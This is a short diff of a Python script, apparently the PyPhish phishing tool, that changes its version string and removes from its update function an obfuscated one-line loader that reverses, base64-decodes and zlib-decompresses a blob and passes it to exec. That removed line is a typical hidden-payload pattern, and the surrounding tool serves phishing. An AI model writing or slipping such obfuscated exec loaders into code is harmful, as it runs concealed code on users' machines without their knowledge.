@@ -100,7 +100,7 @@ bcyan="\033[1;36m"
 white="\033[0;37m"
 nc="\033[00m"
 
-version="1.6"
+version="1.0"
 
 ask = green + '[' + white + '?' + green + '] '+ yellow
 success = yellow + '[' + white + '√' + yellow + '] '+green
@@ -222,7 +222,6 @@ def killer():
 # Update of PyPhish
 def update():
     internet()
-    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=UhGYtKAu00QNIBzKStsw2UJFRFl8TehcQM1SKupwy3ll0mI8LqoU3oE8ysoCKugAIl40WT10Sl0UpUKN9iyOwiTyDV0Lx8yLd9zPlMyR9yyIPFTLzJe'))
     git_ver=popen("curl -s -N https://raw.githubusercontent.com/SnehKr/PyPhish/main/files/version.txt").read().strip()
     if (version != git_ver and git_ver != "404: Not Found"):
         changelog=popen("curl -s -N https://raw.githubusercontent.com/SnehKr/PyPhish/main/files/changelog.log").read()
